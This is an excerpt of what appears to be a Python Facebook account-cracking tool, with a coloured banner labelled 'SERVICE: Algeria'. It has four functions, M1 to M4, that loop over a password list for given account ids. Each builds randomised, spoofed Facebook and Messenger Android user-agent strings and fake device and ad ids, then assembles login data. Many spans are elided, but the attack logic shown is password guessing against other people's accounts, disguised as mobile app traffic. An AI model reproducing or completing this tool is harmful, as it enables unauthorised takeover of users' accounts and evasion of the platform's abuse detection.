...
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;32mSERVICE \033[1;31m: Algeria
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;32mVERSION \033[1;37m: 1.7
\033[1;32m══════════════════════════════════════""")
def linex():
    print('\033[1;32m══════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/268.0.0.17.333;FBPN/com.facebook.orca;FBLC/it_IT;FBBV/35943326;FBCR/Cable & Wireless;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix_X573;FBSV/8.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1225,height=2065};FB_FW/1;FBRV/43522645;]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/448.0.0.30.259;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/64432299;FBCR/Koodo Mobile;FBMF/Realme;FBBD/Realme;FBDV/RMX3551;FBSV/9.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=874,height=2274};FB_FW/1;FBRV/44407895;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/196.0.0.19;FBPN/com.facebook.orca;FBLC/el_GR;FBBV/57248134;FBCR/Clear Wireless;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2277;FBSV/10.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=0.75,width=1050,height=2178};FB_FW/1;FBRV/52354610;]"
...
def M4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/196.0.0.15;FBPN/com.facebook.orca;FBLC/it_IT;FBBV/18383574;FBCR/Verizon;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2549;FBSV/13.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.5,width=924,height=2132};FB_FW/1;FBRV/38596466;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
